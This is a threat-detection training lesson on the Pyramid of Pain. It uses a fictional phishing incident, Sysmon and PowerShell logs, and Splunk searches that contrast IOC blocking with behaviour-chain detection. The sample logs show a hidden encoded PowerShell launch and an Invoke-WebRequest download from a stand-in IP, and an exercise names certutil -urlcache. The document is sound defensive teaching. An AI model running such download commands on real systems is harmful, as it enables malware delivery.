# Day 09 — IOCs vs Behaviours: the Pyramid of Pain

📅 19 October 2026 · 🏷️ Threat intelligence · ⏱️ ~25 min

---

## Why it matters

By the end of Day 08 the `WS-FIN07` story had a clear shape: a lookalike
domain sent `Invoice_88214.docm`, Word ran a macro, and PowerShell downloaded
a file from `203.0.113.80`. The obvious next step for any SOC is to collect
the **indicators of compromise (IOCs)** from that incident (the hashes, IPs and
domain) and block them everywhere. That's worth doing, and it takes minutes.
The problem is that the attacker can **change** most of those values just as
fast. Today is about which clues are cheap for an attacker to swap and which
ones hurt them to change, and why your best detections are built on the
second kind.

---

## The concept

### IOCs and behaviours

| Term | What it is | Example from Northwind |
|---|---|---|
| **IOC** (indicator of compromise) | A specific value seen in an attack | `203.0.113.80`, `fabrikam-suppl1es.example`, a file's SHA256 |
| **Behaviour** (sometimes called an *indicator of attack*, IOA) | A pattern of **what the attacker does**, whatever values they use | "An Office app starts a shell that runs hidden, encoded PowerShell which downloads a file" |

An IOC answers "**have we seen this exact thing?**" A behaviour answers
"**is something acting like an attack?**"

### The Pyramid of Pain

In 2013 David J. Bianco drew the types of indicator as a pyramid. The higher
up the pyramid you detect, the more **pain** it causes the attacker to get
around you.

| Level (bottom to top) | Pain for the attacker | Why | Northwind example |
|---|---|---|---|
| **Hash values** | Trivial | Change one byte and the hash is completely different | SHA256 of `Invoice_88214.docm` |
| **IP addresses** | Easy | Rent another server or use a different proxy | `203.0.113.61`, `.62`, `.80` |
| **Domain names** | Simple | Register a new one for a few dollars | `fabrikam-suppl1es.example` |
| **Network / host artifacts** | Annoying | Needs changes to the tooling or how it's configured | A `.dat` file dropped in `%TEMP%`, the bait file name, a `Reply-To` on a free-mail domain |
| **Tools** | Challenging | Must find or build, and learn, a new tool | A particular macro builder or downloader |
| **TTPs** (tactics, techniques and procedures) | Tough! | Must change **how they operate** | Macro document → `cmd.exe` → hidden `-enc` PowerShell → download over HTTP |

> 💡 **The analyst's shortcut:** IOCs at the bottom of the pyramid are still
> useful: they're **fast to deploy** and **great for scoping** ("who else
> talked to this IP?"). But they **go stale** quickly. Use them to look
> backwards, and use behaviours to catch what comes next.

### Where earlier days sit on the pyramid

| Day | Detection | Level |
|---|---|---|
| 01–03 | Many failed logons then a success; one source, many accounts | TTP (brute force, spraying) |
| 05 | Renamed tool: `OriginalFileName` doesn't match `Image` | Host artifact / TTP |
| 06 | `powershell.exe` with `-EncodedCommand` | TTP |
| 07 | Office app starting a shell | TTP |
| 08 | Macro attachment from a never-seen sender domain | Behaviour, not a fixed domain |

None of them depend on a single IP or hash. That's why they kept working on
new hosts.

---

## Sample logs

All times are UTC. 03:14 UTC on **Friday 16 October** is **14:14 in Sydney**.

First, the **IOC list** Northwind's SOC built from `WS-FIN07` on Thursday
15 October and pushed out that evening (IPs and the domain blocked at the
firewall and mail gateway, hashes added as Defender for Endpoint indicators).
Hashes are fictional.

```
#  Type     Value                                                             Seen as                    Pyramid level
1  sha256   09654B796118709DDAD68CDA23E0EB0F80C8416100AE55CDA862AE89D513EC86  Invoice_88214.docm         Hash
2  sha256   6E2E68D0172B2FA2F0A86477088625B9D8FEF2D541727AC106892C6670584BDC  invoice.dat (Day 07)       Hash
3  ipv4     203.0.113.61                                                      Spoofed email (Day 08)     IP
4  ipv4     203.0.113.62                                                      Lookalike email (Day 08)   IP
5  ipv4     203.0.113.80                                                      Download server (Day 07)   IP
6  domain   fabrikam-suppl1es.example                                         Lookalike sender (Day 08)  Domain
7  file     Invoice_88214.docm                                                Attachment name            Host artifact
```

Then the **message trace** for finance mailboxes on Friday morning (2
messages with attachments). Both passed SPF, DKIM and DMARC.

```
Received  Recipient   From (header)                         SenderIP       Attachment            SHA256 (attachment)  Action
02:58:06  priya.nair  accounts@fabrikam-suppl1es.example    203.0.113.62   Invoice_88214.docm    09654B…EC86          Blocked (sender domain on block list)
03:13:51  ben.okafor  remittance@fabrikam-billing.example   198.51.100.66  Remittance_5521.xlsm  CB6D23…392D          Delivered
  (fabrikam-billing.example registered 2026-10-15)
```

Then the **Sysmon events** on `WS-FIN03`, the laptop of **Ben Okafor** in
finance, from the moment Outlook started. All rows are
`User: NORTHWIND\ben.okafor`. In this lab, Northwind's internal network is
`192.0.2.0/24`, and `WS-FIN03` is `192.0.2.37`.

```
UtcTime (2026-10-16)  EventID  PID   PPID  ParentImage   Image           Detail
03:02:11              1        6104  2988  explorer.exe  OUTLOOK.EXE     "…\Office16\OUTLOOK.EXE"
03:09:40              1        6230  6104  OUTLOOK.EXE   msedge.exe      "…\msedge.exe" --single-argument https://intranet.northwind-example.com/payroll
03:14:22              1        6388  6104  OUTLOOK.EXE   EXCEL.EXE       "…\Office16\EXCEL.EXE" "…\Content.Outlook\Q8ZP4L2C\Remittance_5521.xlsm"
03:14:37              1        6412  6388  EXCEL.EXE     cmd.exe         cmd.exe /c powershell -NoP -W Hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBS…
03:14:37              1        6420  6412  cmd.exe       powershell.exe  powershell -NoP -W Hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBS…
03:14:38              3        6420  -     -             powershell.exe  tcp 192.0.2.37:50112 -> 198.51.100.93:80 (Initiated: true)
03:14:39              11       6420  -     -             powershell.exe  TargetFilename: C:\Users\ben.okafor\AppData\Local\Temp\remit.dat
```

And the **Event ID 4104** that Script Block Logging wrote:

```
Event ID: 4104   Level: Verbose   Computer: WS-FIN03.northwind-example.com
TimeCreated (UTC): 2026-10-16 03:14:38
Creating Scriptblock text (1 of 1):
Invoke-WebRequest -Uri http://198.51.100.93/remit.dat -OutFile $env:TEMP\remit.dat
```

Defender for Endpoint recorded the SHA256 of `remit.dat` as
`67B1C86318BBAB5EEFDD293A73D14027120AE1AFE9D39330EAC29C6E6BDF96AB`.

---

## What to look for

1. **The block list worked, once.** At 02:58:06 the attacker sent the **same**
   `Invoice_88214.docm` again, from the **same** domain and IP. That one
   message matches **4** of the 7 IOCs (#1 hash, #4 IP, #6 domain, #7 file
   name), and the mail gateway blocked it.
2. **About 15 minutes later, the IOCs were useless.** At 03:13:51 a new email
   arrived from a **new** domain (`fabrikam-billing.example`, registered the
   day before), a **new** IP (`198.51.100.66`), with a **new** file name, file
   type (`.xlsm`, not `.docm`) and hash. The download went to a **new** IP
   (`198.51.100.93`) and dropped a **new** file (`remit.dat`). On `WS-FIN03`,
   **0** of the 7 IOCs match anything.
3. **What did not change.** Finance staff as the target, a Fabrikam lookalike
   sender, a macro-enabled Office attachment opened from Outlook, Office
   starting `cmd.exe` **15 seconds** after opening (03:14:22 to 03:14:37),
   `cmd.exe /c powershell -NoP -W Hidden -enc`, `Invoke-WebRequest` to a bare
   IP over port 80, and a `.dat` file in `%TEMP%`. That's the top of the
   pyramid, and it's identical to Thursday.
4. **The behaviour rules fire.** Day 07's Office-child rule matches the
   `cmd.exe` event at 03:14:37. Day 06's encoded-PowerShell rule matches the
   `powershell.exe` event. Neither rule contains a single IP, domain or hash.
5. **The normal rows.** Of the **7** Sysmon events on `WS-FIN03`, **3** are
   routine: Explorer starting Outlook, Outlook opening Edge for an intranet
   link, and Outlook opening an attachment in Excel (normal on its own; it's
   the file type that's interesting). The other **4** are the attack:
   `cmd.exe`, `powershell.exe`, the outbound connection and the dropped file.
6. **New IOCs are still worth collecting.** `fabrikam-billing.example`,
   `198.51.100.66`, `198.51.100.93` and the two new hashes go on the list
   **today**, so you can sweep for other mailboxes and hosts that saw them.
   Just don't expect them to catch Monday's wave.

---

## Detection logic

**In plain English:** first, the cheap IOC sweep, which is fast but only
finds what you already know. Then a **behaviour** search that alerts when, on
one host within **5 minutes**, at least **2** of these 3 steps happen:

1. an Office app starts a shell or script host,
2. PowerShell starts with an encoded command,
3. PowerShell opens a connection to an address **outside** Northwind.

Requiring 2 of 3 stages means one odd event on its own doesn't page anyone,
but the chain does, whatever IP, domain or file it uses.

**SPL 1: IOC sweep (Splunk, any index, last 24 hours):**

```spl
index=* earliest=-24h
    ("09654B796118709DDAD68CDA23E0EB0F80C8416100AE55CDA862AE89D513EC86"
     OR "6E2E68D0172B2FA2F0A86477088625B9D8FEF2D541727AC106892C6670584BDC"
     OR "203.0.113.61" OR "203.0.113.62" OR "203.0.113.80"
     OR "fabrikam-suppl1es.example" OR "Invoice_88214.docm")
| stats count BY index, sourcetype, host
```

This is a plain **keyword search**: Splunk looks for each value anywhere in
the raw event. On the sample, it returns only the 02:58:06 blocked message
from the mail logs. Nothing on `WS-FIN03` matches.

**SPL 2: behaviour chain (Sysmon, Splunk Add-on for Sysmon field names):**

```spl
source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" (EventCode=1 OR EventCode=3)
| eval parent=lower(mvindex(split(ParentImage, "\\"), -1)),
       proc=lower(mvindex(split(Image, "\\"), -1))
| eval stage=case(
    EventCode==1 AND in(parent, "winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe")
        AND in(proc, "cmd.exe", "powershell.exe", "pwsh.exe", "wscript.exe", "cscript.exe", "mshta.exe"),
        "1_office_spawns_shell",
    EventCode==1 AND in(proc, "powershell.exe", "pwsh.exe")
        AND match(CommandLine, "(?i) -(e|ec|enc|encodedcommand) "),
        "2_encoded_powershell",
    EventCode==3 AND in(proc, "powershell.exe", "pwsh.exe")
        AND NOT cidrmatch("192.0.2.0/24", DestinationIp),
        "3_powershell_outbound")
| where isnotnull(stage)
| stats dc(stage) AS stages, values(stage) AS stage_list, values(User) AS user,
        values(DestinationIp) AS dest_ip, min(_time) AS first_seen, max(_time) AS last_seen
        BY host
| where stages >= 2 AND (last_seen - first_seen) <= 300
| convert ctime(first_seen) ctime(last_seen)
```

How it works:

- `split(..., "\\")` and `mvindex(..., -1)` keep just the file name, the same
  trick as Day 07's stacking search. `lower()` makes the comparison
  case-insensitive.
- `case()` gives each event the **first** stage it matches, or nothing. The
  `cmd.exe` event matches stage 1 (parent `excel.exe`). The `powershell.exe`
  event doesn't (its parent is `cmd.exe`) but matches stage 2. The Event ID 3
  matches stage 3, because `198.51.100.93` is outside `192.0.2.0/24`.
- `in()`, `match()` and `cidrmatch()` are standard eval functions. The regex
  has a space on each side, so `-enc` matches but `-ExecutionPolicy` doesn't.
- `stats dc(stage) ... BY host` counts **distinct** stages per host, and the
  last `where` keeps hosts with 2 or more within 300 seconds.

On the sample, it returns **1** row: `WS-FIN03`, **3** stages, first seen
03:14:37, last seen 03:14:38 (1 second apart), destination `198.51.100.93`.
The other 4 events match no stage: Event ID 11 isn't in the search, and
Outlook, Edge and Excel have no shell parent or child.

**Tuning note:** both thresholds are starting points. Day 07's stacking found
a business macro where Excel starts `cmd.exe` 22 times on one host. That gives
stage 1 only, so it won't fire on its own, but if that macro also runs
PowerShell that talks to the internet, exclude it **narrowly** (the exact host
and command line), never a whole parent like `EXCEL.EXE`. Because `stats`
looks at the whole search window, a host with an unrelated stage hours apart
is dropped by the 300-second check rather than alerted on; run the search
over short, overlapping windows (for example every 15 minutes over the last
20). An attacker whose macro starts `certutil.exe` or `bitsadmin.exe`
directly would match **none** of the three stages, which is why you'd add
those tools as a fourth stage over time. Keep the IOC sweep too: it's cheap, but give every IOC an
**expiry date** (for IPs, days to weeks), because a rented IP may belong to
someone innocent next month.

---

## Your turn

1. Place each of these on the Pyramid of Pain: `198.51.100.66`,
   `fabrikam-billing.example`, the SHA256 of `remit.dat`, the file path
   `%TEMP%\remit.dat`, "a `Reply-To` on a free-mail domain", and
   "Office → `cmd.exe` → `powershell -W Hidden -enc` → download". For each,
   say in one line how long you'd expect it to stay useful.
2. Make two columns: what the attacker **changed** between Thursday
   (`WS-FIN07`) and Friday (`WS-FIN03`), and what stayed the **same**. Which
   column would you rather build a detection on, and why?
3. Extend SPL 2 with a fourth stage, `4_lolbin_download`, for an Office app
   **or** `cmd.exe` starting `certutil.exe` with `-urlcache` in its command
   line. Should the threshold stay at `stages >= 2`? Explain your choice.
4. Your team lead says: "We've blocked the new IP and domain, so close the
   ticket." Write a short, polite reply (3–4 sentences) explaining what the
   block does and doesn't protect against, and what you'd still do before
   closing.

---

## My answers

<!-- Answer each question in your own words, then commit. -->

1.

2.

3.

4.

---

## Further reading

- David J. Bianco: [The Pyramid of Pain](https://detect-respond.blogspot.com/2013/03/the-pyramid-of-pain.html)
- NIST: [SP 800-150, Guide to Cyber Threat Information Sharing](https://csrc.nist.gov/pubs/sp/800/150/final)
- Microsoft Learn: [Create indicators in Microsoft Defender for Endpoint](https://learn.microsoft.com/en-us/defender-endpoint/manage-indicators) · [Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
- Splunk Docs: [Evaluation functions](https://docs.splunk.com/Documentation/Splunk/latest/SearchReference/CommonEvalFunctions) · [stats](https://docs.splunk.com/Documentation/Splunk/latest/SearchReference/Stats)
- MITRE ATT&CK: [T1566.001 Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001/) · [T1059.001 PowerShell](https://attack.mitre.org/techniques/T1059/001/) · [T1105 Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/) · [T1583.001 Acquire Infrastructure: Domains](https://attack.mitre.org/techniques/T1583/001/)

⬅️ [Learning log index](README.md) · ➡️ [Day 10: Mapping detections to MITRE ATT&CK (20 Oct)](2026-10-20-mapping-to-mitre-attack.md)
